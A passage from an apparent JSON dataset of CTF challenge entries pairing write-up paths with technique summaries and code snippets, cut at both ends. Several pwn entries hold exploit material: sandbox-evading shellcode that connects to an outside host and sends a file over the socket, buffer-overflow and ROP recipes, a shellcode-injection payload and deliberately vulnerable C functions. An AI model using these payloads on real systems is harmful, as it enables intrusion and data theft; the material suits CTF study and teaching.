        "key": "```c\n__printf_chk(1LL, \"Give me your flag: \");\n__isoc99_scanf(\"%127s\", input);\n\nresult[0].qwords.low = sub_400BA0((q_xmm_word)(input[0] * (unsigned __int128)s[0]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nresult[0].qwords.high = sub_400BA0((q_xmm_word)(input[1] * (unsigned __int128)s[1]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nresult[1].qwords.low = sub_400BA0((q_xmm_word)(input[2] * (unsigned __int128)s[2]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nresult[1].qwords.high = sub_400BA0((q_xmm_word)(input[3] * (unsigned __int128)s[3]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nresult[2].qwords.low = sub_400BA0((q_xmm_word)(input[4] * (unsigned __int128)s[4]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nresult[2].qwords.high = sub_400BA0((q_xmm_word)(input[5] * (unsigned __int128)s[5]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nresult[3].qwords.low = sub_400BA0((q_xmm_word)(input[6] * (unsigned __int128)s[6]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nresult[3].qwords.high = sub_400BA0((q_xmm_word)(input[7] * (unsigned __int128)s[7]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nresult[4].qwords.low = sub_400BA0((q_xmm_word)(input[8] * (unsigned __int128)s[8]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nresult[4].qwords.high = sub_400BA0((q_xmm_word)(input[9] * (unsigned __int128)s[9]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nresult[5].qwords.low = sub_400BA0((q_xmm_word)(input[10] * (unsigned __int128)s[10]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nresult[5].qwords.high = sub_400BA0((q_xmm_word)(input[11] * (unsigned __int128)s[11]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nresult[6].qwords.low = sub_400BA0((q_xmm_word)(input[12] * (unsigned __int128)s[12]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nresult[6].qwords.high = sub_400BA0((q_xmm_word)(input[13] * (unsigned __int128)s[13]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nresult[7].qwords.low = sub_400BA0((q_xmm_word)(input[14] * (unsigned __int128)s[14]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nv3 = sub_400BA0((q_xmm_word)(input[15] * (unsigned __int128)s[15]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\nv4 = _mm_load_si128((const __m128i *)result);\nresult[7].qwords.high = v3;\n```"
    },
    {
        "name": "babysandbox (pwn)",
        "write_up": "dataset/raw/babysandbox (pwn).md",
        "type": "pwn",
        "competition": [
            "MeePwn/2018/Quals",
            "https://ctftime.org/event/625/tasks/"
        ],
        "score": 100,
        "max_score": 940,
        "difficulty": 0.10638297872340426,
        "knowledge": [
            "In challenges where sandbox evasion is required, and the security mechanism filters certain syscalls, identifying unique characteristics of the execution environment (such as specific register values) can help in differentiating between execution in a sandboxed environment and native execution. This knowledge can be used to conditionally execute arbitrary code only in the desired environment. As demonstrated, checking the `ecx` register's value to determine if the code is running natively or within a sandboxed environment like Unicorn can guide strategic execution paths. Example payload snippet: \n   ```\n   cmp ecx, 0x100\n   jnz loose\n   ```",
            "Utilizing `pwnlib.shellcraft` for generating shellcode provides a convenient method to incorporate complex operations such as file reading or establishing network connections into exploit payloads without manually writing the assembly code. This is particularly useful in CTF challenges for extracting information from a vulnerable application or system once sandbox restrictions are bypassed or when direct execution of arbitrary code is possible. Combining sandbox evasion techniques with shellcraft's pre-built functionalities enables efficient and effective exploitation. Example payload snippet for sending file contents over a network connection:\n   ```\n   shellcraft.i386.linux.connect(\"1.2.3.4\", 55555) +\n   shellcraft.i386.linux.readfile(\"flag\", \"edx\")\n   ```"
        ],
        "key": "```python\ndef get_payload():  \n   return {  \n       \"payload\": base64.b64encode(  \n           asm(  \n               \"cmp ecx, 0x100\\n\" +  # if ecx == 0x100 we run in \"bin\" and NOT in unicorn (sandbox evasion)  \n               \"jnz loose\\n\" +  \n               shellcraft.i386.linux.connect(\"1.2.3.4\", 55555) +  # we ran a nc -l -p 55555 on a server  \n               shellcraft.i386.linux.readfile(\"flag\", \"edx\") +   # edx contains the socket descriptor from connect(),  \n                                                                 # flag is a file (good guess)  \n               \"loose:\\n\" +  \n               \"nop\"  # unicorn runs till the end of this code; there must not be any other code after the nop  \n           )  \n       ).decode()  \n   }\n```"
    },
    {
        "name": "babystack",
        "write_up": "dataset/raw/babystack.md",
        "type": "pwn",
        "competition": [
            "0CTF/2018/Quals",
            "https://ctftime.org/event/557/tasks/"
        ],
        "score": 132,
        "max_score": 1000,
        "difficulty": 0.132,
        "knowledge": [
            "In challenges involving a stack overflow vulnerability where direct control over the return address is not possible due to stack canaries or other protections, one can use techniques to manipulate other control data like the old base pointer (rbp) value. This manipulation can lead to Arbitrary Address Write (AAW) by carefully crafting inputs to overwrite control data and then leveraging indirect control over the instruction pointer (rip) to execute a Return-Oriented Programming (ROP) chain. This method can be particularly useful in binaries where stack canaries protect the return address but other control data can still be overwritten.\n   \n   Example approach: \n   - First input to read function: \"\\x00\"*0x10 (if applicable, based on binary's read behavior).\n   - Craft a payload that overwrites the old rbp value with a controlled value.\n   - Use a sequence of gadgets like [pop rbp; ret], a fake rbp value, and [leave; ret] to control the stack layout and execute a longer ROP chain beyond initial payload size limitations.",
            "When addressing challenges with stack overflow vulnerabilities on `x86-64` architectures with protections like NX, Canary, and ASLR enabled, but with No RELRO, it's possible to leak important addresses (like `atol@GOT` for libc base address calculation) and then overwrite the stack canary with a known good value. This technique allows for the execution of a 'one gadget' execve(\"/bin/sh\") or similar RCE (Remote Code Execution) payload by bypassing stack protection mechanisms. This method leverages the vulnerability to write beyond the buffer limit, using knowledge about the binary's behavior and memory layout (such as TLS location in case of pthread usage) to bypass modern binary exploitation mitigations.\n\n   Example approach:\n   - Leak necessary libc addresses (e.g., `atol@GOT`) for libc base address calculation.\n   - Bypass the stack canary by overwriting it with a leaked or correctly guessed value.\n   - Execute a 'one gadget' or construct a ROP chain to spawn a shell or perform other unintended operations."
        ],
        "key": "```c\nvoid vulnerable_function() {\n    char buffer[64];\n    read(0, buffer, 16);\n    size_t actual_len = strlen(buffer);\n    read(0, buffer + actual_len, 56 - actual_len);\n}\n```"
    },
    {
        "name": "Babysteps",
        "write_up": "dataset/raw/Babysteps.md",
        "type": "pwn",
        "competition": [
            "NahamCon/2022",
            "https://ctftime.org/event/1630/tasks/"
        ],
        "score": 385,
        "max_score": 2199,
        "difficulty": 0.17507958162801274,
        "knowledge": [
            "In scenarios where a buffer overflow vulnerability is identified in a binary exploitation challenge, specifically without stack canaries, NX disabled, and a known buffer size, use a payload that consists of an adequate number of NOPs to reach the EIP register, followed by a \"jmp eax\" gadget address if the buffer\u2019s location is stored in the EAX register. This approach redirects code execution to a shellcode placed right after the EIP. It's essential to calculate the buffer to EIP offset accurately.  \nExample payload structure: `\\x90` * offset + `jmp eax gadget address` + `shellcode`",
            "Utilize tools like ROPgadget to find the necessary gadget, such as \"jmp eax\", for constructing a working exploit when dealing with binary exploitation challenges, especially when direct execution flow manipulation is required to achieve code execution. The selection of the \"jmp eax\" gadget is contingent upon confirming that the buffer or payload to be executed is pointed to by the EAX register.\nExample command: `ROPgadget --binary binary_name | grep \"jmp eax\"`"
        ],
        "key": "```c\nvoid ask_baby_name() {  \n char buffer[BABYBUFFER];  \n puts(\"First, what is your baby name?\");  \n return gets(buffer);  \n}\n\nint main(int argc, char **argv){  \n ...  \n puts(\"How's it going, babies!!\");  \n puts(\"Are you ready for the adventure of a lifetime? (literally?)\");  \n puts(\"\");  \n ask_baby_name();  \n ...  \n}\n```"
    },
    {
        "name": "Backtalk",
        "write_up": "dataset/raw/Backtalk.md",
        "type": "crypto",
        "competition": [
            "WPICTF/2019",
            "https://ctftime.org/event/728/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing Diffie-Hellman key exchange protocol information in network captures, discrete logarithm problems can be efficiently solved using computational algebra systems like SageMath, specifically when handling large modulus numbers. It is crucial to identify the generator `g`, modulus `mod`, and the public keys exchanged to compute the shared secret key. In scenarios where direct computation of discrete logarithm is infeasible due to computational limitations, dropping optional parameters (like the 'ord' parameter in SageMath's `discrete_log` function) might resolve the issue, as it can impact the efficiency of the computation.  \nExample SageMath code snippet:  \n```python\nK = GF(mod)  \ndiscrete_log(K(pub), K(g))  # where 'pub' and 'g' are known values from the key exchange\n```",
            "To decrypt messages encrypted with Diffie-Hellman key exchange based symmetric keys, once the shared secret is calculated, it can be used to decrypt the encryption key (`enc_key`) if the encryption follows a scheme similar to ElGamal encryption. This involves converting the shared secret and `enc_key` to a form usable by symmetric key algorithms like AES. In this context, decryption requires determining the symmetric key from `enc_key` and the shared secret, then using it with the appropriate symmetric decryption algorithm. This method is applicable in scenarios where the shared secret and an encrypted symmetric key are available from intercepted encrypted communications.  \nExample Python code snippet for decryption process:  \n```python\nsecret = some_shared_secret_calculation_method()  # Calculate or retrieve the shared secret\nmod = some_mod_value()  # The modulus used in the key exchange\nenc_key = some_enc_key_value()  # The encrypted symmetric key retrieved from communications\n\n# Calculate the decryption key\nkey = enc_key * pow(secret, mod - 2, mod) % mod\nkey_bytes = Crypto.Util.number.long_to_bytes(key)  # Convert key to byte format\n\n# Decrypt using AES in ECB mode\nfrom Crypto.Cipher import AES\ncipher = some_cipher_text()  # The encrypted message to decrypt\naes = AES.new(key_bytes, mode = AES.MODE_ECB)\ndecrypted_message = aes.decrypt(cipher)\n```"
        ],
        "key": "```python\npub = pow(g, random_number, mod)\n```"
    },
    {
        "name": "Backup - frank",
        "write_up": "dataset/raw/Backup - frank.md",
        "type": "crypto",
        "competition": [
            "MidnightSun/2021/Quals",
            "https://ctftime.org/event/1139/tasks/"
        ],
        "score": 121,
        "max_score": 428,
        "difficulty": 0.2827102803738318,
        "knowledge": [
            "When half of an RSA private key is erased, one can use the visible part of the key and OCR (Optical Character Recognition) tools like pytesseract in Python to recover the readable parts from images. This step is pivotal in processes where physical or digital corruption has led to partial loss of key data. Correcting OCR mistakes manually ensures the accuracy of the recovered data, which is critical for the next steps of key reconstruction.",
            "In scenarios where parts of the RSA key components (like `p`, `q`, `dp`, `dq`) are known and the goal is to recover missing components, mathematical relationships among these components can be utilized. For instance, `p = (e*dp - 1)/kp + 1` and `q = (e*dq - 1)/kq + 1`, where `e` is the public exponent and `dp`, `dq` are parts of the private key. A script can then brute force `kp` and `kq` to recover the prime numbers `p` and `q`, enabling the reconstruction of the full private key. This approach applies when enough key details are visible or recoverable to derive the necessary components.\n\nExample Python snippet for reconstructing full RSA private key:\n```python\nfrom Crypto.PublicKey import RSA\ne = 0x10001  # Public exponent\n# Assuming the 'n', 'p', 'q', 'dp', 'dq' values are derived from the above steps\nphi = (p-1) * (q-1)\nd = pow(e, -1, phi)  # Derive private exponent\nkey = RSA.construct((n, e, d, p, q))  # Construct RSA key object\npem = key.exportKey('PEM')  # Export the private key in PEM format\nprint(pem.decode())\n```"
        ],
        "key": "```python\nfrom Crypto.Util.number import bytes_to_long, isPrime\nfrom sympy import *\n\ndp = 0xc0cfc776f9bcad7e90e82f00b582c0ffe26f5acc4bc465b89cbf3c76097ad515563f3e0f67358f350c1b7d6a216b2e7adbe71c4f114cd2b971b83a070e1ec0e17e395b4f8c0496dd6134a857316cd6bd5b8e83e9c019ec2f5a4d0240b9ce5a10154926be9cc10fa0da2d7d223a166daac89c8723c6132547d1162fd8bdd43d80217667986ec6dce91ba1bdaf6d55450c73e9c5c8a7f9d4eb38bc2f0c6139f261926aa3fe68011ef0b7af34e9996c4d0a3095b48f9f585882d4a46bf44afa00672b21619a2862fc9cb48093604ffa7f15bd43697eac8e74e93dbc5f1d75fd8f61310b7b87d7fd729c5d6da4b069d8037dfeb6dcd8dd8db4e2375b8a095f692b51\ndq = 0x51c69153116a1f1c9664ec0e9e68bec093342d2645aa465ca8afb61dd7039075a8aa0dd3b6d006d649b9dbd7c9ac8861b03e6db921416a6b6d7850b0bceecad6341770e75fd6d17699886ce68eb72d7c7c19995510df53aea435af7b806eb410483adf6c1274eafa93220bdde73e9ac6fc4f2e04bc85d8a5ff73c58805afd6a44fe6982de5be0b5b3c2d8df65acd79a1cce103de46b7dc8f9daac71298228e795d41a93121a3114687893a9265ae50251dbab3943c39c795b2ae5f5040cf6f11c4869d085155476ab0c1936082d222febd0b28f364108e6d326c9d7fa68b0f35f0c79581eeaa1480ad5a11a44d78af533e1485ced12d3941f97644757c05d7c5\n\ne = 0x10001\n\nfor kq in range(1, e):\n   q_mul = dq * e - 1\n   if q_mul % kq == 0:\n       q = (q_mul // kq) + 1\n       if isPrime(q):\n       \tprint(\"Potential q: \" + str(q))\n\nfor kp in range(1, e):\n   p_mul = dp * e - 1\n   if p_mul % kp == 0:\n       p = (p_mul // kp) + 1\n       if isPrime(p):\n       \tprint(\"Potential p: \" + str(p))\n```"
    },
    {
        "name": "back_to_basics",
        "write_up": "dataset/raw/back_to_basics.md",
        "type": "crypto",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When dealing with custom encoding mechanisms where each character of a key represents a base in which the input is encoded, the decryption process requires iteratively decoding the data from the largest possible base down to the base that yields a plausible result, typically ASCII printable characters. The approach involves identifying the maximum character in the encoded data, determining its base from a custom alphabet, and attempting to decode from all possible bases greater than this determined base until the output falls within expected ASCII ranges.",
            "In scenarios involving encoded data that does not conform to standard encoding methods (e.g., Base64, Hex), constructing a custom decode function that works with arbitrary bases can help in decryption attempts. This function should convert the encoded data from its string representation back to binary, considering the specific alphabet used for encoding. This process is essential when the encoding scheme employs a non-standard alphabet or when data is encoded using variable bases."
        ],
        "key": "```python  \ndef base_n_encode(bytes_in, base):  \n\treturn mpz(bytes_to_long(bytes_in)).digits(base).upper().encode()\n\ndef base_n_decode(bytes_in, base):  \n\tbytes_out = to_binary(mpz(bytes_in, base=base))[:1:-1]  \n\treturn bytes_out\n\ndef encrypt(bytes_in, key):  \n\tout = bytes_in  \n\tfor i in key:  \n\t\tprint(i)  \n\t\tout = base_n_encode(out, ALPHABET.index(i))  \n\treturn out\n\ndef decrypt(bytes_in, key):  \n\tout = bytes_in  \n\tfor i in key:  \n\t\tout = base_n_decode(out, ALPHABET.index(i))  \n\treturn out\n```"
    },
    {
        "name": "Bad Python",
        "write_up": "dataset/raw/Bad Python.md",
        "type": "reverse",
        "competition": [
            "TJCTF/2020",
            "https://ctftime.org/event/928/tasks/"
        ],
        "score": 50,
        "max_score": 100,
        "difficulty": 0.5,
        "knowledge": [
            "For encryption and decryption involving XOR operations, if the encryption algorithm involves XORing the plaintext with a sequence of values (derived from a key or password) and the operation is repeated in a deterministic manner (e.g., modulo operation based on plaintext index), then the decryption process can use the same sequence of XOR operations in reverse with the known or brute-forced key to retrieve the original plaintext. This principle leverages the property of XOR where applying the same operation twice will revert to the original value.\n   \n   Example payload for decryption (given key and encrypted output):\n   ```\n   decrypted_output = []\n   key = 'exampleKey123'\n   encrypted_output = b'\\x01\\x02\\x03...' # snippet of encrypted data\n   for i in range(len(encrypted_output)):\n       ki = ord(key[i % len(key)]) # Repeat key characters as necessary\n       decrypted_output.append(chr(encrypted_output[i] ^ ki))\n   decrypted_text = ''.join(decrypted_output)\n   ```",
            "In scenarios where an encryption scheme relies on the properties and arrangement of characters within a key (e.g., characters used in groups, sorting of characters within groups, modulo operations for selecting group members), brute-forcing can be optimized by segmenting the key into parts according to its usage within the algorithm and testing combinations of character values that align with observed patterns in the encrypted output when compared against known plaintext. This technique is particularly effective when the encryption process can be understood or replicated from reverse-engineering the algorithm.\n\n   Example approach for key retrieval segment-wise:\n   ```\n   for each segment in key:\n       for all possible values in segment:\n           if encrypted_value derived from segment matches known pattern with plaintext:\n               segment_value = possible_value\n               break as potential part of the key\n   reconstruct full key using identified segment values\n   ```"
        ],
        "key": "```python\nimport random  \nA=bool  \nN=ord  \ny=sorted  \nY=list  \nh=bin  \nT=int  \ne=range  \nF=len  \nL=open  \nO=repr  \nR=random.shuffle  \nimport itertools  \nimport functools  \nD=functools.reduce  \nS=A  \nP=lambda a,b:(N(a)^N(b)).to_bytes(1,'big')  \nB='[redacted - 15 chars]'  \nE=((0,3),(1,4),(0,1),(3,4),(2,3),(1,2))  \nB=y(Y(B))  \nx=lambda a,b:h((N(a)-N(b))^(T('1'*10,2)))[0]!='-'  \ndef u(li):  \nQ=[li[i::3]for i in e(3)]  \nfor i in Q:  \n while not W(i):  \n  pass  \nreturn Q  \ndef W(i):  \nR(i)  \na=[S(T(h(N('e'))[2:][-1]))]  \nreturn[n(a,x(i[E[j][0]],i[E[j][1]]))for j in e(F(E))][-1]  \ndef n(g,k):  \ng[0]=g[0]and k  \nreturn g[0]  \nf=u(B)  \na=L('input.txt','r').read()  \nm='output.txt'  \nL(m,'w').write(O(b''.join([D(P,[(((N(a[i])&(~N(f[j][i%5])))|((~N(a[i]))&(N(f[j][i%5])))).to_bytes(1,\"big\"))for\nj in e(F(f))])for i in e(F(a))])))\n```"
    },
    {
        "name": "Baffling Buffer 1",
        "write_up": "dataset/raw/Baffling Buffer 1.md",
        "type": "pwn",
        "competition": [
            "MetaCTF/2020",
            "https://ctftime.org/event/1106/tasks/"
        ],
        "score": -1,
        "max_score": 525,
        "difficulty": -1,
        "knowledge": [
            "When exploiting vulnerable functions like `gets()` that do not limit input length, buffer overflow can be achieved by sending an input longer than the buffer size. This can be combined with a tactic to bypass string processing limitations (like a null byte to signify the end of valid input) before overflowing the buffer to overwrite critical addresses such as the return address on the stack. This leads to arbitrary code execution by redirecting execution flow to a desired function within the binary. As demonstrated, to target a specific function (`win` in this instance), calculate the necessary padding to reach the return address and overwrite it with the target function's address. Example payload snippet: `\"\\x00\" + pad*\"A\" + p64(win).decode()`",
            "In scenarios requiring interaction with a remote service for exploiting buffer overflow vulnerabilities, Python's `pwntools` library is an invaluable resource for crafting and sending payloads. It simplifies the process of connecting to remote services, crafting payloads (including packing of addresses in the correct format using functions like `p64()`), and parsing responses. This is especially useful for CTF challenges or pen-testing exercises targeting binaries susceptible to buffer overflow. To interact with a remote service and exploit a buffer overflow, the script structure generally includes creating a remote connection, sending the crafted payload, and handling the response to extract information like flags. Example script snippet: \n```\nfrom pwn import *\nhost, port = \"host1.metaproblems.com\", 5151\nr = remote(host, port)\nwin = 0x401172\nr.sendline(\"payload_here\") # Craft and send the payload here\nprint(r.recvall())\n```"
        ],
        "key": "```c\n#include <stdio.h>\n\nvoid vuln() {\n    char buf[50];\n    gets(buf);\n}\n\nvoid win() {\n    // Code to read and write the flag\n}\n\nint main() {\n    vuln();\n    return 0;\n}\n```"
    },
    {
        "name": "Baffling Buffer 2",
        "write_up": "dataset/raw/Baffling Buffer 2.md",
        "type": "pwn",
        "competition": [
            "MetaCTF/2020",
            "https://ctftime.org/event/1106/tasks/"
        ],
        "score": 400,
        "max_score": 525,
        "difficulty": 0.7619047619047619,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities leveraging the `gets()` function, one can bypass various input validation mechanisms by including a null byte (`0x00`) within the payload. This is effective since `gets()` does not stop reading input at a null byte, unlike many string handling functions such as `fopen()` which consider a null byte as the end of the string. This discrepancy can be exploited to execute arbitrary code or control program flow by carefully crafting the input to overflow the buffer and manipulate the program's execution.\n   - Example payload part: `b\"/etc/passwd\\x00\" + cyclic(100)`",
            "For executing a remote code execution via a buffer overflow in a binary with NX (No eXecute) protection enabled, a Return Oriented Programming (ROP) chain can be used. Initially, libc base address can be leaked by crafting a payload that calls a libc function (e.g., `puts`) with a known GOT entry, enabling calculation of the base address with the offset. Following the address leakage, a ROP chain can include gadgets such as `pop rax; ret` to fulfill specific gadget constraints (like `rax` being NULL for certain one-gadget executions) before invoking a one-gadget or system call to spawn a shell. This approach leverages the static nature of binary addresses due to disabled PIE (Position Independent Executable) and the dynamic nature of libc addresses necessitating the leak.\n   - Example gadget setup for ROP chain: \n     ```python\n     pop_rax = libc.address + 0x000000000003a638  \n     one_gadget = libc.address + 0x4484f  \n     rc.raw(p64(pop_rax))  \n     rc.raw(p64(0x0))  \n     rc.raw(p64(one_gadget)) \n     ```"
        ],
        "key": "```c\n#include <stdio.h>\n\nvoid vulnerable_function() {\n    char buffer[64];\n    printf(\"Enter some text: \");\n    gets(buffer); // Vulnerable function\n    printf(\"You entered: %s\\n\", buffer);\n}\n\nint main() {\n    vulnerable_function();\n    return 0;\n}\n```"
    },
    {
        "name": "bakflip&sons",
        "write_up": "dataset/raw/bakflip&sons.md",
        "type": "crypto",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 925,
        "max_score": 1000,
        "difficulty": 0.925,
        "knowledge": [
            "In cryptographic challenges involving an ECDSA signature oracle, it may be possible to manipulate the oracle's behavior to reveal portions of the secret key. By providing a bitmask, which affects the computation of the public key point (e.g., `secret ^ mask * G`), one can analyze the variations in the generated public keys to deduce the bits of the secret. Specifically, flipping a single bit in the secret (using the mask) and observing the change in the resultant public key allows one to deduce the original state of the flipped bit in the secret key.",
            "To systematically uncover the bits of a secret key bit-by-bit in challenges involving bit manipulation and ECDSA, use a strategy that involves sending modified requests to the oracle with varying bitmask lengths. Start with affecting the least significant bit (LSB) and progressively target more significant bits, while recovering portions of the secret key incrementally. This approach can be scaled to recover multiple bits at a time by leveraging known bits to minimize the search space, using masks to flip specific bits of interest, and comparing the outcomes with expected results based on ECC properties. \n\nExample strategy (Pseudocode snippet):\n```\nFor start_bit in range(0, secret_key_length, bits_at_once):\n    secret_mask = create_mask(bits_to_guess, start_bit)\n    signature = request_signature(message, secret_mask)\n    recovered = analyze_responses(signature, reference_points, bits_to_guess, start_bit)\n    print(\"Recovered secret chunk: \", recovered)\n```"
        ],
        "key": "```python\ndef recover_bits(oracle, bits_to_guess, start_bit):  \n   message = \"alamakota\"  \n   signature = oracle(message, 0)  \n   reference_keys = VerifyingKey.from_public_key_recovery(signature, message, NIST192p)  \n   reference_points = [ref_key.pubkey.point for ref_key in reference_keys]  \n   secret_mask = int('1' * bits_to_guess + '0' * start_bit, 2)  \n   signature = oracle(message, secret_mask)  \n   flipped_keys = VerifyingKey.from_public_key_recovery(signature, message, NIST192p)  \n   for key in flipped_keys:  \n       for reference_point in reference_points:  \n           for option in itertools.product([1, -1], repeat=bits_to_guess):  \n               mods = [m * 2 ** (i + start_bit) for i, m in enumerate(option)]  \n               point_modification = reduce(lambda x, y: x + y, [m * NIST192p.generator for m in mods])  \n               if key == VerifyingKey.from_public_point(reference_point + point_modification):  \n                   # -1 means we flipped bit from 1 to 0  \n                   # 1 means we flipped by from 0 to 1  \n                   result = \"\".join(['1' if k == -1 else '0' for k in option][::-1])  \n                   print('recovered chunk ', result)  \n                   return result  \n```"
    },
    {
        "name": "Base64 Encoder",
        "write_up": "dataset/raw/Base64 Encoder.md",
        "type": "reverse",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 656,
        "max_score": 906,
        "difficulty": 0.7240618101545254,
        "knowledge": [
            "When attempting to exploit a binary with base64 encoding vulnerabilities, especially when dealing with fixed memory mappings and buffer overflows, one effective strategy is to inject shellcode into a writable and executable region of memory. This can be facilitated by manipulating input data structures to store the shellcode in an area mapped with executable permissions. Specifically, in scenarios where a `key` or similar input is base64 encoded and mapped to a fixed, executable address, this region can be utilized to store and execute arbitrary code. The manipulation of the `key` field to include shellcode must be carefully calculated to ensure proper execution flow.\n    - Example preparation of shellcode for injection: \n      ```php\n      $key  = str_pad(\"T+F+N+S/X+e+R\", 0x20, \"/\");\n      $key .= pack(\"V\", 0x41414141);   // Padding\n      $key .= pack(\"V\", 0x41414141);   // More Padding\n      $key .= pack(\"V\", 0x41414141);   // Even More Padding\n      $key .= pack(\"V\", 0x77777030);   // Target PC (Program Counter) Address\n      $key .= file_get_contents(\"sc\"); // The shellcode itself loaded after the padding and PC address\n      ```",
            "Exploiting buffer overflows in web applications that process base64 encoded data can also be achieved by carefully crafting the size and content of input buffers. Specifically, when encoding with base64 increases the output size (4 bytes of output for every 3 bytes of input), creating a buffer that, when encoded, exceeds the allocated memory size can lead to buffer overflow vulnerabilities. This vulnerability can be exploited to overwrite saved registers or function return addresses, allowing for arbitrary code execution. The exploit requires precise control over the content and length of the user-supplied data to manipulate the program's execution flow successfully.\n    - Example of triggering a buffer overflow: \n      ```php\n      $buffer = pack(\"V\", 0x77777030); // Control the buffer to point to an executable address containing the shellcode\n      $clear  = decode($key, $buffer); // Decode operation used to manipulate buffer lengths and trigger the overflow\n      assert(3 === strlen($clear)); // Ensuring the decoded buffer has the expected length, part of controlling the exploit\n      $buffer  = str_repeat($clear, (249 + 12) / 2); // Crafting the payload to trigger overflow\n      ```"
        ],
        "key": "```c\n#define PROT_RWX PROT_READ | PROT_WRITE | PROT_EXEC\n\nstruct request {\n\tchar *cmd;\n\tchar *buffer;\n\tchar *key;\n};\n\nstruct request r = malloc(sizeof(r));\n\nr->cmd    = malloc(0x10);\nr->buffer = malloc(0x100);\nr->key    = mmap(0x77777000, 0x1000, PROT_RWX, MMAP_FIXED | MMAP_ANON, 0, 0);\n\nparseBody(&r, body);\n```"
    },
    {
        "name": "Based",
        "write_up": "dataset/raw/Based.md",
        "type": "crypto",
        "competition": [
            "DigitalOverdose/2022",
            "https://ctftime.org/event/1623/tasks/"
        ],
        "score": 200,
        "max_score": 200,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges where encoded or ciphered text is given without specific instructions on what type of encoding or ciphering is used, one should consider common encoding schemes such as Base64 as a starting point. This approach is based on the assumption that strings ending with one or more '=' signs or containing characters from the Base64 character set might be Base64 encoded. To decode Base64 encoded data, the Linux command `cat <file> | base64 -d` can be used.\n   \nExample payload: `cat based.txt | base64 -d`",
            "When encountering a part of the challenge hinting towards the usage of classic ciphers or mentions keywords like \"city of ROT\" or any reference to rotation, explore using the ROT13 cipher for decoding, as it's one of the most common text rotation schemes. ROT13 is a specific case of the Caesar cipher and can be applied directly to strings to see if they reveal meaningful text. For decoding ROT13, online tools like [rot13.com](https://rot13.com) can be used or a script can be written to shift letters 13 positions in the alphabet.\n\nExample payload: Input the coded message into `https://rot13.com`"
        ],
        "key": "```python\ndef decode_base64(encoded_str):\n    import base64\n    return base64.b64decode(encoded_str).decode('utf-8')\n\ndef decode_rot13(encoded_str):\n    import codecs\n    return codecs.decode(encoded_str, 'rot_13')\n\ndef decode_morse(morse_code):\n    MORSE_CODE_DICT = { '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E',\n                        '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J',\n                        '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O',\n                        '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',\n                        '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y',\n                        '--..': 'Z', '-----': '0', '.----': '1', '..---': '2', '...--': '3',\n                        '....-': '4', '.....': '5', '-....': '6', '--...': '7', '---..': '8',\n                        '----.': '9'}\n    return ''.join(MORSE_CODE_DICT.get(i, '') for i in morse_code.split())\n\ndef decode_vigenere(ciphertext, key):\n    def shift(c, k):\n        return chr(((ord(c) - ord('A')) - (ord(k) - ord('A'))) % 26 + ord('A'))\n    \n    key = (key * (len(ciphertext) // len(key) + 1))[:len(ciphertext)]\n    return ''.join(shift(c, k) for c, k in zip(ciphertext, key))\n\n# Example usage\nbase64_str = \"R3JhbmRwYSBzZW50IG1lIG9uIGEgdHJlYXN1cmUgaHVudCB0byBnZXQgYSBsb3N0IGZsYWcgYnV0IHRoZSBtYXAgd2FzbnQgY29tcGxldGVkLiBBbGwgSSBzYXcgd2FzIHRoZSBjaXR5IG9mIFJPVCBhbmQgYSBjb2RlZCBtZXNzYWdlOiBKdW5nIGxiaCBqdmZ1IHNiZSB2ZiBuZyAuLi4tIC4uIC0tLiAuIC0uIC4gLi0uIC4gLi4uIC0uLS4gLi0gLi4uIC0gLi0uLiAuIGhmciBndXIgeHJsIFFCZ2piIG5hcSBjZWJpdnFyIGd1ciBjdWVuZnIgVFBJQ0d7TXBjSHBrc2tLYmlman0=\"\ndecoded_base64 = decode_base64(base64_str)\nprint(decoded_base64)\n\nrot13_str = \"Jung lbh jvfu sbe vf ng ...- .. --. . -. . .-. . ... -.-. .- ... - .-.. . hfr gur xrl QBgjb naq cebivqr gur cuenfr TPICG{MpcHpkskKbifj}\"\ndecoded_rot13 = decode_rot13(rot13_str)\nprint(decoded_rot13)\n\nmorse_code = \"...- .. --. . -. . .-. . ... -.-. .- ... - .-.. .\"\ndecoded_morse = decode_morse(morse_code)\nprint(decoded_morse)\n\nvigenere_ciphertext = \"GCVPT{ZcpUcxfxXovsw}\"\nvigenere_key = \"DOtwo\"\ndecoded_vigenere = decode_vigenere(vigenere_ciphertext, vigenere_key)\nprint(decoded_vigenere)\n```"
    },
    {
        "name": "Bash history",
        "write_up": "dataset/raw/Bash history.md",
        "type": "forensics",
        "competition": [
            "SyskronSecurity/2020",
            "https://ctftime.org/event/1148/tasks/"
        ],
        "score": 200,
        "max_score": 500,
        "difficulty": 0.4,
        "knowledge": [
